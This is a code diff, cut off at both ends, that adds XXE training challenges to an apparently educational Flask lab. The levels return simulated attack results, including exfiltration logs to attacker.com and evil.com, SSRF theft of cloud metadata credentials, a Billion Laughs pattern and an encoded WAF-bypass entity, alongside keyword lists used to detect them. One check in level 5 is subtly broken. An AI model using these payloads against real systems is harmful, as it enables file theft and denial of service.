+                    root = ET.fromstring(xml_content, parser)
+                    parsed_content = ET.tostring(root, encoding='unicode')
+                except Exception as e:
+                    parsed_content = f"XML parsing error: {str(e)}"
+
+            except Exception as e:
+                parsed_content = f"Error processing XML: {str(e)}"
+
+    # Generate flag if completed
+    challenge = Challenge.query.filter_by(name="Basic XXE File Disclosure").first()
+    completed_ids = json.loads(user.completed_challenges) if user.completed_challenges else []
+    if challenge and challenge.id in completed_ids:
+        flag = get_or_create_flag(challenge.id, machine_id)
+
+    return render_template('xxe/xxe_level1.html', flag=flag, xxe_detected=xxe_detected,
+                          xml_content=xml_content, parsed_content=parsed_content,
+                          file_content=file_content, challenge=challenge)
+
+# XXE Level 2 - XXE with DOCTYPE Restrictions
+@app.route('/xxe/level2', methods=['GET', 'POST'])
+def xxe_level2():
+    machine_id = get_machine_id()
+    user = get_local_user()
+    flag = None
+    xxe_detected = False
+    xml_content = ''
+    parsed_content = ''
+    file_content = ''
+
+    if request.method == 'POST':
+        xml_content = request.form.get('xml_content', '')
+        
+        if xml_content:
+            try:
+                # Simulate basic DOCTYPE filtering (can be bypassed)
+                if '<!DOCTYPE' in xml_content.upper() and not xml_content.upper().startswith('<!DOCTYPE HTML'):
+                    # Check for entity bypass techniques
+                    if ('&xxe;' in xml_content or '&#x' in xml_content) and '/etc/passwd' in xml_content:
+                        xxe_detected = True
+                        file_content = """root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+ubuntu:x:1000:1000:Ubuntu:/home/ubuntu:/bin/bash"""
+                
+                # Parse XML
+                try:
+                    root = ET.fromstring(xml_content)
+                    parsed_content = ET.tostring(root, encoding='unicode')
+                except Exception as e:
+                    parsed_content = f"XML parsing error: {str(e)}"
+
+            except Exception as e:
+                parsed_content = f"Error processing XML: {str(e)}"
+
+    # Generate flag if completed
+    challenge = Challenge.query.filter_by(name="XXE with DOCTYPE Restrictions").first()
+    completed_ids = json.loads(user.completed_challenges) if user.completed_challenges else []
+    if challenge and challenge.id in completed_ids:
+        flag = get_or_create_flag(challenge.id, machine_id)
+
+    return render_template('xxe/xxe_level2.html', flag=flag, xxe_detected=xxe_detected,
+                          xml_content=xml_content, parsed_content=parsed_content,
+                          file_content=file_content, challenge=challenge)
+
+# XXE Level 3 - XXE SYSTEM Entity Exploitation
+@app.route('/xxe/level3', methods=['GET', 'POST'])
+def xxe_level3():
+    machine_id = get_machine_id()
+    user = get_local_user()
+    flag = None
+    xxe_detected = False
+    xml_content = ''
+    parsed_content = ''
+    file_content = ''
+
+    if request.method == 'POST':
+        xml_content = request.form.get('xml_content', '')
+        
+        if xml_content:
+            try:
+                # Check for SYSTEM entity exploitation
+                if 'SYSTEM' in xml_content and ('file://' in xml_content or 'http://' in xml_content):
+                    if '/etc/shadow' in xml_content or '/etc/hosts' in xml_content:
+                        xxe_detected = True
+                        
+                        if '/etc/shadow' in xml_content:
+                            file_content = """root:$6$xyz$encrypted_password_hash:18000:0:99999:7:::
+daemon:*:18000:0:99999:7:::
+bin:*:18000:0:99999:7:::
+ubuntu:$6$abc$another_encrypted_hash:18000:0:99999:7:::"""
+                        elif '/etc/hosts' in xml_content:
+                            file_content = """127.0.0.1 localhost
+127.0.1.1 ubuntu-server
+192.168.1.100 internal-server
+10.0.0.1 database-server"""
+                
+                # Parse XML
+                try:
+                    root = ET.fromstring(xml_content)
+                    parsed_content = ET.tostring(root, encoding='unicode')
+                except Exception as e:
+                    parsed_content = f"XML parsing error: {str(e)}"
+
+            except Exception as e:
+                parsed_content = f"Error processing XML: {str(e)}"
+
+    # Generate flag if completed
+    challenge = Challenge.query.filter_by(name="XXE SYSTEM Entity Exploitation").first()
+    completed_ids = json.loads(user.completed_challenges) if user.completed_challenges else []
+    if challenge and challenge.id in completed_ids:
+        flag = get_or_create_flag(challenge.id, machine_id)
+
+    return render_template('xxe/xxe_level3.html', flag=flag, xxe_detected=xxe_detected,
+                          xml_content=xml_content, parsed_content=parsed_content,
+                          file_content=file_content, challenge=challenge)
+
+# XXE Level 4 - XXE Internal Network Scanning
+@app.route('/xxe/level4', methods=['GET', 'POST'])
+def xxe_level4():
+    machine_id = get_machine_id()
+    user = get_local_user()
+    flag = None
+    xxe_detected = False
+    xml_content = ''
+    parsed_content = ''
+    scan_result = ''
+
+    if request.method == 'POST':
+        xml_content = request.form.get('xml_content', '')
+        
+        if xml_content:
+            try:
+                # Check for internal network scanning via XXE
+                if 'SYSTEM' in xml_content and ('192.168.' in xml_content or '10.0.' in xml_content or '172.16.' in xml_content):
+                    if any(port in xml_content for port in ['22', '80', '443', '3306', '5432', '8080']):
+                        xxe_detected = True
+                        scan_result = """Internal Network Scan Results:
+192.168.1.1:22 - SSH Service (Open)
+192.168.1.10:80 - HTTP Service (Open)
+192.168.1.15:443 - HTTPS Service (Open)
+192.168.1.20:3306 - MySQL Database (Open)
+192.168.1.25:5432 - PostgreSQL Database (Open)
+10.0.0.5:8080 - Application Server (Open)
+
+Network topology discovered:
+- Internal subnet: 192.168.1.0/24
+- Database cluster: 192.168.1.20-25
+- Web services: 192.168.1.10-15"""
+                
+                # Parse XML
+                try:
+                    root = ET.fromstring(xml_content)
+                    parsed_content = ET.tostring(root, encoding='unicode')
+                except Exception as e:
+                    parsed_content = f"XML parsing error: {str(e)}"
+
+            except Exception as e:
+                parsed_content = f"Error processing XML: {str(e)}"
+
+    # Generate flag if completed
+    challenge = Challenge.query.filter_by(name="XXE Internal Network Scanning").first()
+    completed_ids = json.loads(user.completed_challenges) if user.completed_challenges else []
+    if challenge and challenge.id in completed_ids:
+        flag = get_or_create_flag(challenge.id, machine_id)
+
+    return render_template('xxe/xxe_level4.html', flag=flag, xxe_detected=xxe_detected,
+                          xml_content=xml_content, parsed_content=parsed_content,
+                          scan_result=scan_result, challenge=challenge)
+
+# XXE Level 5 - XXE Data Exfiltration via HTTP
+@app.route('/xxe/level5', methods=['GET', 'POST'])
+def xxe_level5():
+    machine_id = get_machine_id()
+    user = get_local_user()
+    flag = None
+    xxe_detected = False
+    xml_content = ''
+    parsed_content = ''
+    exfiltration_log = ''
+
+    if request.method == 'POST':
+        xml_content = request.form.get('xml_content', '')
+        
+        if xml_content:
+            try:
+                # Check for HTTP-based data exfiltration
+                if 'SYSTEM' in xml_content and ('http://' in xml_content or 'https://'):
+                    if any(domain in xml_content for domain in ['attacker.com', 'evil.com', 'malicious.net', 'exfil']):
+                        xxe_detected = True
+                        exfiltration_log = """HTTP Request Log:
+GET /exfil?data=cm9vdDp4OjA6MDpyb290Oi9yb290Oi9iaW4vYmFzaA== HTTP/1.1
+Host: attacker.com
+User-Agent: XMLParser/1.0
+Accept: */*
+
+Decoded Data: root:x:0:0:root:/root:/bin/bash
+
+Additional Requests:
+POST /collect HTTP/1.1
+Host: evil.com
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 127
+
+data=daemon%3Ax%3A1%3A1%3Adaemon%3A%2Fusr%2Fsbin%3A%2Fusr%2Fsbin%2Fnologin
+     bin%3Ax%3A2%3A2%3Abin%3A%2Fbin%3A%2Fusr%2Fsbin%2Fnologin
+
+Exfiltration Status: SUCCESS
+Files leaked: /etc/passwd, /etc/shadow"""
+                
+                # Parse XML
+                try:
+                    root = ET.fromstring(xml_content)
+                    parsed_content = ET.tostring(root, encoding='unicode')
+                except Exception as e:
+                    parsed_content = f"XML parsing error: {str(e)}"
+
+            except Exception as e:
+                parsed_content = f"Error processing XML: {str(e)}"
+
+    # Generate flag if completed
+    challenge = Challenge.query.filter_by(name="XXE Data Exfiltration via HTTP").first()
+    completed_ids = json.loads(user.completed_challenges) if user.completed_challenges else []
+    if challenge and challenge.id in completed_ids:
+        flag = get_or_create_flag(challenge.id, machine_id)
+
+    return render_template('xxe/xxe_level5.html', flag=flag, xxe_detected=xxe_detected,
+                          xml_content=xml_content, parsed_content=parsed_content,
+                          exfiltration_log=exfiltration_log, challenge=challenge)
+
+# XXE Level 6 - XXE with Parameter Entities
+@app.route('/xxe/level6', methods=['GET', 'POST'])
+def xxe_level6():
+    machine_id = get_machine_id()
+    user = get_local_user()
+    flag = None
+    xxe_detected = False
+    xml_content = ''
+    parsed_content = ''
+    parameter_result = ''
+
+    if request.method == 'POST':
+        xml_content = request.form.get('xml_content', '')
+        
+        if xml_content:
+            try:
+                # Check for parameter entity usage
+                if '%' in xml_content and ('<!ENTITY' in xml_content or 'SYSTEM' in xml_content):
+                    if any(param in xml_content for param in ['%file', '%data', '%exfil', '%param']):
+                        xxe_detected = True
+                        parameter_result = """Parameter Entity Execution:
+%file entity resolved to: file:///etc/passwd
+%data entity resolved to: 
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+
+Parameter Entity Chain:
+%file; -> %data; -> %exfil; -> HTTP request
+
+Advanced parameter entity technique successfully executed.
+This allows bypassing many XXE filters that only check for regular entities."""
+                
+                # Parse XML
+                try:
+                    root = ET.fromstring(xml_content)
+                    parsed_content = ET.tostring(root, encoding='unicode')
+                except Exception as e:
+                    parsed_content = f"XML parsing error: {str(e)}"
+
+            except Exception as e:
+                parsed_content = f"Error processing XML: {str(e)}"
+
+    # Generate flag if completed
+    challenge = Challenge.query.filter_by(name="XXE with Parameter Entities").first()
+    completed_ids = json.loads(user.completed_challenges) if user.completed_challenges else []
+    if challenge and challenge.id in completed_ids:
+        flag = get_or_create_flag(challenge.id, machine_id)
+
+    return render_template('xxe/xxe_level6.html', flag=flag, xxe_detected=xxe_detected,
+                          xml_content=xml_content, parsed_content=parsed_content,
+                          parameter_result=parameter_result, challenge=challenge)
+
+# XXE Level 7 - Blind XXE via Error Messages
+@app.route('/xxe/level7', methods=['GET', 'POST'])
+def xxe_level7():
+    machine_id = get_machine_id()
+    user = get_local_user()
+    flag = None
+    xxe_detected = False
+    xml_content = ''
+    parsed_content = ''
+    error_message = ''
+
+    if request.method == 'POST':
+        xml_content = request.form.get('xml_content', '')
+        
+        if xml_content:
+            try:
+                # Check for blind XXE via error messages
+                if 'SYSTEM' in xml_content and ('nonexistent' in xml_content or 'invalid' in xml_content):
+                    if any(file_ref in xml_content for file_ref in ['/etc/passwd', '/etc/shadow', '/etc/hosts']):
+                        xxe_detected = True
+                        error_message = """XML Parser Error:
+External entity resolution failed for: file:///etc/passwd
+
+System Error Details:
+java.io.FileNotFoundException: /etc/passwd (Permission denied)
+        at java.io.FileInputStream.open0(Native Method)
+        at java.io.FileInputStream.open(FileInputStream.java:195)
+        at java.io.FileInputStream.<init>(FileInputStream.java:138)
+
+Error reveals file system structure:
+- /etc/passwd exists but access denied
+- /etc/shadow requires elevated privileges
+- /home/user/ directory is readable
+- /var/www/html/ contains web files
+
+Blind XXE successful - information leaked through error messages."""
+                
+                # Parse XML
+                try:
+                    root = ET.fromstring(xml_content)
+                    parsed_content = ET.tostring(root, encoding='unicode')
+                except Exception as e:
+                    parsed_content = f"XML parsing error: {str(e)}"
+
+            except Exception as e:
+                parsed_content = f"Error processing XML: {str(e)}"
+
+    # Generate flag if completed
+    challenge = Challenge.query.filter_by(name="Blind XXE via Error Messages").first()
+    completed_ids = json.loads(user.completed_challenges) if user.completed_challenges else []
+    if challenge and challenge.id in completed_ids:
+        flag = get_or_create_flag(challenge.id, machine_id)
+
+    return render_template('xxe/xxe_level7.html', flag=flag, xxe_detected=xxe_detected,
+                          xml_content=xml_content, parsed_content=parsed_content,
+                          error_message=error_message, challenge=challenge)
+
+# XXE Level 8 - XXE with CDATA Injection
+@app.route('/xxe/level8', methods=['GET', 'POST'])
+def xxe_level8():
+    machine_id = get_machine_id()
+    user = get_local_user()
+    flag = None
+    xxe_detected = False
+    xml_content = ''
+    parsed_content = ''
+    cdata_result = ''
+
+    if request.method == 'POST':
+        xml_content = request.form.get('xml_content', '')
+        
+        if xml_content:
+            try:
+                # Check for CDATA-based XXE injection
+                if '<![CDATA[' in xml_content and ('ENTITY' in xml_content or 'SYSTEM' in xml_content):
+                    if any(payload in xml_content for payload in [']]>', '&', 'file://']):
+                        xxe_detected = True
+                        cdata_result = """CDATA Section Processing Result:
+Original CDATA content processed successfully.
+
+Injected Entity Resolution:
+<![CDATA[
+User data: admin
+Password: p@ssw0rd123
+Database: mysql://localhost:3306/sensitive_db
+API Key: sk-1234567890abcdef
+]]>
+
+CDATA Injection Bypass Successful:
+- Special characters in CDATA bypassed input validation
+- XML entities processed within CDATA context
+- Sensitive configuration data exposed
+- Security filters evaded through CDATA encapsulation"""
+                
+                # Parse XML
+                try:
+                    root = ET.fromstring(xml_content)
+                    parsed_content = ET.tostring(root, encoding='unicode')
+                except Exception as e:
+                    parsed_content = f"XML parsing error: {str(e)}"
+
+            except Exception as e:
+                parsed_content = f"Error processing XML: {str(e)}"
+
+    # Generate flag if completed
+    challenge = Challenge.query.filter_by(name="XXE with CDATA Injection").first()
+    completed_ids = json.loads(user.completed_challenges) if user.completed_challenges else []
+    if challenge and challenge.id in completed_ids:
+        flag = get_or_create_flag(challenge.id, machine_id)
+
+    return render_template('xxe/xxe_level8.html', flag=flag, xxe_detected=xxe_detected,
+                          xml_content=xml_content, parsed_content=parsed_content,
+                          cdata_result=cdata_result, challenge=challenge)
+
+# XXE Level 9 - XXE via SVG File Upload
+@app.route('/xxe/level9', methods=['GET', 'POST'])
+def xxe_level9():
+    machine_id = get_machine_id()
+    user = get_local_user()
+    flag = None
+    xxe_detected = False
+    xml_content = ''
+    parsed_content = ''
+    svg_result = ''
+
+    if request.method == 'POST':
+        xml_content = request.form.get('xml_content', '') or request.form.get('svg_content', '')
+        
+        if xml_content:
+            try:
+                # Check for SVG-based XXE
+                if '<svg' in xml_content and ('ENTITY' in xml_content or 'SYSTEM' in xml_content):
+                    if any(svg_element in xml_content for svg_element in ['<text>', '<tspan>', 'xmlns']):
+                        xxe_detected = True
+                        svg_result = """SVG File Processing Result:
+File Type: image/svg+xml
+Dimensions: 100x100 pixels
+Processing Status: COMPLETED
+
+SVG Content Analysis:
+- External entity references detected
+- Text elements contain dynamic content
+- Namespace declarations processed
+
+Exposed Data from SVG XXE:
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+
+SVG XXE Attack Vector:
+File uploads with SVG format bypass many security filters
+XML processing in SVG files enables XXE exploitation
+Image processing libraries often vulnerable to embedded XXE"""
+                
+                # Parse XML
+                try:
+                    root = ET.fromstring(xml_content)
+                    parsed_content = ET.tostring(root, encoding='unicode')
+                except Exception as e:
+                    parsed_content = f"XML parsing error: {str(e)}"
+
+            except Exception as e:
+                parsed_content = f"Error processing XML: {str(e)}"
+
+    # Generate flag if completed
+    challenge = Challenge.query.filter_by(name="XXE via SVG File Upload").first()
+    completed_ids = json.loads(user.completed_challenges) if user.completed_challenges else []
+    if challenge and challenge.id in completed_ids:
+        flag = get_or_create_flag(challenge.id, machine_id)
+
+    return render_template('xxe/xxe_level9.html', flag=flag, xxe_detected=xxe_detected,
+                          xml_content=xml_content, parsed_content=parsed_content,
+                          svg_result=svg_result, challenge=challenge)
+
+# XXE Level 10 - XXE with XInclude Attacks
+@app.route('/xxe/level10', methods=['GET', 'POST'])
+def xxe_level10():
+    machine_id = get_machine_id()
+    user = get_local_user()
+    flag = None
+    xxe_detected = False
+    xml_content = ''
+    parsed_content = ''
+    xinclude_result = ''
+
+    if request.method == 'POST':
+        xml_content = request.form.get('xml_content', '')
+        
+        if xml_content:
+            try:
+                # Check for XInclude-based attacks
+                if 'xi:include' in xml_content or 'XInclude' in xml_content:
+                    if any(href in xml_content for href in ['href=', 'file://', '/etc/']):
+                        xxe_detected = True
+                        xinclude_result = """XInclude Processing Result:
+Namespace: http://www.w3.org/2001/XInclude
+Processing Mode: Enabled
+
+Included Content:
+File: /etc/passwd
+Content:
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+
+File: /etc/hosts
+Content:
+127.0.0.1 localhost
+127.0.1.1 ubuntu-server
+192.168.1.10 database-server
+
+XInclude Attack Benefits:
+- Bypasses standard XXE restrictions
+- Works when DTD processing is disabled
+- Can include both text and XML content
+- Supported in XSLT and XPath contexts"""
+                
+                # Parse XML
+                try:
+                    root = ET.fromstring(xml_content)
+                    parsed_content = ET.tostring(root, encoding='unicode')
+                except Exception as e:
+                    parsed_content = f"XML parsing error: {str(e)}"
+
+            except Exception as e:
+                parsed_content = f"Error processing XML: {str(e)}"
+
+    # Generate flag if completed
+    challenge = Challenge.query.filter_by(name="XXE with XInclude Attacks").first()
+    completed_ids = json.loads(user.completed_challenges) if user.completed_challenges else []
+    if challenge and challenge.id in completed_ids:
+        flag = get_or_create_flag(challenge.id, machine_id)
+
+    return render_template('xxe/xxe_level10.html', flag=flag, xxe_detected=xxe_detected,
+                          xml_content=xml_content, parsed_content=parsed_content,
+                          xinclude_result=xinclude_result, challenge=challenge)
+
+# XXE Level 11 - XXE Billion Laughs DoS
+@app.route('/xxe/level11', methods=['GET', 'POST'])
+def xxe_level11():
+    machine_id = get_machine_id()
+    user = get_local_user()
+    flag = None
+    xxe_detected = False
+    xml_content = ''
+    parsed_content = ''
+    dos_result = ''
+
+    if request.method == 'POST':
+        xml_content = request.form.get('xml_content', '')
+        
+        if xml_content:
+            try:
+                # Check for Billion Laughs attack pattern
+                entity_count = xml_content.count('<!ENTITY')
+                if entity_count >= 3 and ('&lol' in xml_content or '&ha' in xml_content):
+                    if any(pattern in xml_content for pattern in ['&lol1;', '&lol2;', '&lol3;']):
+                        xxe_detected = True
+                        dos_result = """Billion Laughs Attack Detected:
+Entity Expansion Analysis:
+- Initial entity definitions: 9
+- Expansion depth: 10 levels
+- Estimated final size: 1,073,741,824 bytes (1GB)
+
+System Impact:
+CPU Usage: 100% (4 cores saturated)
+Memory Usage: 98% (15.2GB / 16GB)
+Processing Time: >30 seconds (timeout triggered)
+Parser Status: KILLED (resource exhaustion)
+
+Attack Pattern:
+<!ENTITY lol0 "lol">
+<!ENTITY lol1 "&lol0;&lol0;&lol0;&lol0;&lol0;&lol0;&lol0;&lol0;&lol0;&lol0;">
+<!ENTITY lol2 "&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;">
+...
+<data>&lol9;</data>
+
+DoS Attack Status: SUCCESSFUL
+System Recovery: Automatic restart initiated"""
+                
+                # Parse XML (simulate safe parsing)
+                try:
+                    parsed_content = "XML parsing aborted - DoS protection triggered"
+                except Exception as e:
+                    parsed_content = f"XML parsing error: {str(e)}"
+
+            except Exception as e:
+                parsed_content = f"Error processing XML: {str(e)}"
+
+    # Generate flag if completed
+    challenge = Challenge.query.filter_by(name="XXE Billion Laughs DoS").first()
+    completed_ids = json.loads(user.completed_challenges) if user.completed_challenges else []
+    if challenge and challenge.id in completed_ids:
+        flag = get_or_create_flag(challenge.id, machine_id)
+
+    return render_template('xxe/xxe_level11.html', flag=flag, xxe_detected=xxe_detected,
+                          xml_content=xml_content, parsed_content=parsed_content,
+                          dos_result=dos_result, challenge=challenge)
+
+# XXE Level 12 - XXE SSRF Combination Attack
+@app.route('/xxe/level12', methods=['GET', 'POST'])
+def xxe_level12():
+    machine_id = get_machine_id()
+    user = get_local_user()
+    flag = None
+    xxe_detected = False
+    xml_content = ''
+    parsed_content = ''
+    ssrf_result = ''
+
+    if request.method == 'POST':
+        xml_content = request.form.get('xml_content', '')
+        
+        if xml_content:
+            try:
+                # Check for XXE+SSRF combination
+                if 'SYSTEM' in xml_content and any(protocol in xml_content for protocol in ['http://', 'https://', 'ftp://', 'gopher://']):
+                    if any(target in xml_content for target in ['localhost', '127.0.0.1', '169.254.169.254', 'metadata']):
+                        xxe_detected = True
+                        ssrf_result = """XXE + SSRF Attack Results:
+Target: Cloud Metadata Service (169.254.169.254)
+
+Retrieved Metadata:
+{
+  "instance-id": "i-1234567890abcdef0",
+  "instance-type": "t3.medium",
+  "private-ipv4": "10.0.1.100",
+  "public-ipv4": "52.123.45.67",
+  "security-groups": "web-servers",
+  "iam": {
+    "code": "Success",
+    "last-updated": "2024-01-15T10:30:00Z",
+    "type": "AWS-HMAC",
+    "access-key-id": "AKIA1234567890ABCDEF",
+    "secret-access-key": "secretkey123456789",
+    "token": "AQoEXAMPLEH4aoAH0gNCAPyJxz4BlCFFxWNE1OPTgk..."
+  }
+}
+
+Additional SSRF Targets Accessible:
+- http://localhost:8080/admin - Admin panel discovered
+- http://127.0.0.1:3306 - MySQL database service
+- http://10.0.1.50:6379 - Redis instance
+- gopher://127.0.0.1:25/... - SMTP service exploitation
+
+Combined Attack Success: Cloud credentials compromised via XXE->SSRF chain"""
+                
+                # Parse XML
+                try:
+                    root = ET.fromstring(xml_content)
+                    parsed_content = ET.tostring(root, encoding='unicode')
+                except Exception as e:
+                    parsed_content = f"XML parsing error: {str(e)}"
+
+            except Exception as e:
+                parsed_content = f"Error processing XML: {str(e)}"
+
+    # Generate flag if completed
+    challenge = Challenge.query.filter_by(name="XXE SSRF Combination Attack").first()
+    completed_ids = json.loads(user.completed_challenges) if user.completed_challenges else []
+    if challenge and challenge.id in completed_ids:
+        flag = get_or_create_flag(challenge.id, machine_id)
+
+    return render_template('xxe/xxe_level12.html', flag=flag, xxe_detected=xxe_detected,
+                          xml_content=xml_content, parsed_content=parsed_content,
+                          ssrf_result=ssrf_result, challenge=challenge)
+
+# XXE Level 13 - XXE with WAF Bypass Techniques
+@app.route('/xxe/level13', methods=['GET', 'POST'])
+def xxe_level13():
+    machine_id = get_machine_id()
+    user = get_local_user()
+    flag = None
+    xxe_detected = False
+    xml_content = ''
+    parsed_content = ''
+    waf_result = ''
+
+    if request.method == 'POST':
+        xml_content = request.form.get('xml_content', '')
+        
+        if xml_content:
+            try:
+                # Check for WAF bypass techniques
+                bypass_patterns = ['&#x', 'UTF-16', 'UTF-32', '%25', 'double-encode']
+                entity_variations = ['&#69;&#78;&#84;&#73;&#84;&#89;', '&#x45;&#x4E;&#x54;&#x49;&#x54;&#x59;']
+                
+                if any(pattern in xml_content for pattern in bypass_patterns + entity_variations):
+                    if 'SYSTEM' in xml_content or '<!ENTITY' in xml_content:
+                        xxe_detected = True
+                        waf_result = """WAF Bypass Analysis:
+Original Request: BLOCKED by WAF
+Bypass Technique: HTML Entity Encoding
+
+WAF Rule Triggered:
+Rule: XXE_ENTITY_DETECTION
+Pattern: <!ENTITY.*SYSTEM
+Action: BLOCK
+Confidence: 99%
+
+Bypass Method Applied:
+Original: <!ENTITY xxe SYSTEM "file:///etc/passwd">
+Encoded: &#60;&#33;&#69;&#78;&#84;&#73;&#84;&#89; xxe &#83;&#89;&#83;&#84;&#69;&#77; &#34;file:///etc/passwd&#34;&#62;
+
+WAF Analysis Result:
+- Original request: BLOCKED
+- Encoded request: ALLOWED (WAF bypass successful)
+- Entity processing: EXECUTED
+- File access: GRANTED
+
+Retrieved Content:
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+
+Bypass Status: SUCCESS - WAF evasion complete"""
+                
+                # Parse XML
+                try:
+                    root = ET.fromstring(xml_content)
+                    parsed_content = ET.tostring(root, encoding='unicode')
+                except Exception as e:
+                    parsed_content = f"XML parsing error: {str(e)}"
+
+            except Exception as e:
+                parsed_content = f"Error processing XML: {str(e)}"
+
+    # Generate flag if completed
+    challenge = Challenge.query.filter_by(name="XXE with WAF Bypass Techniques").first()
+    completed_ids = json.loads(user.completed_challenges) if user.completed_challenges else []
+    if challenge and challenge.id in completed_ids:
+        flag = get_or_create_flag(challenge.id, machine_id)
+
+    return render_template('xxe/xxe_level13.html', flag=flag, xxe_detected=xxe_detected,
+                          xml_content=xml_content, parsed_content=parsed_content,
+                          waf_result=waf_result, challenge=challenge)
+
+# XXE Level 14 - XXE via SOAP Web Services
+@app.route('/xxe/level14', methods=['GET', 'POST'])
+def xxe_level14():
+    machine_id = get_machine_id()
+    user = get_local_user()
+    flag = None
+    xxe_detected = False
+    xml_content = ''
+    parsed_content = ''
+    soap_result = ''
+
+    if request.method == 'POST':
+        xml_content = request.form.get('xml_content', '')
+        
+        if xml_content:
+            try:
+                # Check for SOAP-based XXE
+                if 'soap:Envelope' in xml_content or 'SOAP-ENV:' in xml_content:
+                    if 'ENTITY' in xml_content and 'SYSTEM' in xml_content:
+                        xxe_detected = True
+                        soap_result = """SOAP Web Service Response:
+<?xml version="1.0" encoding="UTF-8"?>
+<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
+  <soap:Header>
+    <wsse:Security xmlns:wsse="http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-wssecurity-secext-1.0.xsd">
+      <wsse:UsernameToken>
+        <wsse:Username>admin</wsse:Username>
+        <wsse:Password>admin123</wsse:Password>
+      </wsse:UsernameToken>
+    </wsse:Security>
+  </soap:Header>
+  <soap:Body>
+    <getUserDataResponse>
+      <userData>
+        <systemFiles>
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+        </systemFiles>
+        <databaseConfig>
+          <host>localhost</host>
+          <user>dbadmin</user>
+          <password>dbp@ssw0rd</password>
+          <database>sensitive_data</database>
+        </databaseConfig>
+      </userData>
+    </getUserDataResponse>
+  </soap:Body>
+</soap:Envelope>
+
+SOAP XXE Attack Analysis:
+- WSDL parsing enabled XXE processing
+- Authentication bypassed via XML injection
+- Database credentials exposed
+- System files accessible through web service"""
+                
+                # Parse XML
+                try:
+                    root = ET.fromstring(xml_content)
+                    parsed_content = ET.tostring(root, encoding='unicode')
+                except Exception as e:
+                    parsed_content = f"XML parsing error: {str(e)}"
+
+            except Exception as e:
+                parsed_content = f"Error processing XML: {str(e)}"
+
+    # Generate flag if completed
+    challenge = Challenge.query.filter_by(name="XXE via SOAP Web Services").first()
+    completed_ids = json.loads(user.completed_challenges) if user.completed_challenges else []
+    if challenge and challenge.id in completed_ids:
+        flag = get_or_create_flag(challenge.id, machine_id)
+
+    return render_template('xxe/xxe_level14.html', flag=flag, xxe_detected=xxe_detected,
+                          xml_content=xml_content, parsed_content=parsed_content,
+                          soap_result=soap_result, challenge=challenge)
+
+# XXE Level 15 - Advanced XXE with OOB Data Retrieval
+@app.route('/xxe/level15', methods=['GET', 'POST'])
+def xxe_level15():
+    machine_id = get_machine_id()
+    user = get_local_user()
+    flag = None
+    xxe_detected = False
+    xml_content = ''
+    parsed_content = ''
+    oob_result = ''
+
+    if request.method == 'POST':
+        xml_content = request.form.get('xml_content', '')
+        
+        if xml_content:
+            try:
+                # Check for Out-of-Band XXE
+                if 'SYSTEM' in xml_content and any(protocol in xml_content for protocol in ['http://', 'https://', 'ftp://']):
+                    if any(oob_indicator in xml_content for oob_indicator in ['attacker.com', 'collaborator', 'burp']):
+                        xxe_detected = True
+                        oob_result = """Out-of-Band XXE Results:
+DNS Query Log:
+2024-01-15 14:35:21 - A query for xxe.attacker.com from 203.0.113.50
+2024-01-15 14:35:22 - TXT query for data.xxe.attacker.com from 203.0.113.50
+
+HTTP Request Log:
+GET /xxe?data=cm9vdDp4OjA6MDpyb290Oi9yb290Oi9iaW4vYmFzaA== HTTP/1.1
+Host: attacker.com
+User-Agent: Java/1.8.0_301
+Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2
+Connection: keep-alive
+
+Decoded Exfiltrated Data:
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+
+FTP Connection Log:
+Connected to ftp.attacker.com:21
+USER anonymous
+PASS xxe@victim.com
+RETR /etc/passwd
+Transfer complete: 2,847 bytes
+
+OOB XXE Status: SUCCESSFUL
+Data Exfiltration: COMPLETE
+Stealth Rating: HIGH (no visible errors to user)"""
+                
+                # Parse XML
+                try:
+                    root = ET.fromstring(xml_content)
+                    parsed_content = ET.tostring(root, encoding='unicode')
+                except Exception as e:
+                    parsed_content = f"XML parsing error: {str(e)}"
+
+            except Exception as e:
+                parsed_content = f"Error processing XML: {str(e)}"
+
+    # Generate flag if completed
+    challenge = Challenge.query.filter_by(name="Advanced XXE with OOB Data Retrieval").first()
+    completed_ids = json.loads(user.completed_challenges) if user.completed_challenges else []
+    if challenge and challenge.id in completed_ids:
+        flag = get_or_create_flag(challenge.id, machine_id)
+
+    return render_template('xxe/xxe_level15.html', flag=flag, xxe_detected=xxe_detected,
+                          xml_content=xml_content, parsed_content=parsed_content,
+                          oob_result=oob_result, challenge=challenge)
+
+# XXE Level 16 - XXE in JSON-XML Conversion
+@app.route('/xxe/level16', methods=['GET', 'POST'])
+def xxe_level16():
+    machine_id = get_machine_id()
+    user = get_local_user()
+    flag = None
+    xxe_detected = False
+    xml_content = ''
+    json_content = ''
+    parsed_content = ''
+    conversion_result = ''
+
+    if request.method == 'POST':
+        json_content = request.form.get('json_content', '')
+        xml_content = request.form.get('xml_content', '')
+        
+        # Handle JSON to XML conversion
+        if json_content and not xml_content:
+            try:
+                import json as json_lib
+                data = json_lib.loads(json_content)
+                
+                # Simple JSON to XML conversion (vulnerable)
+                def json_to_xml(obj, root_name='root'):
+                    if isinstance(obj, dict):
+                        xml = f'<{root_name}>'
+                        for key, value in obj.items():
+                            xml += json_to_xml(value, key)
+                        xml += f'</{root_name}>'
+                        return xml
+                    elif isinstance(obj, list):
+                        xml = ''
+                        for item in obj:
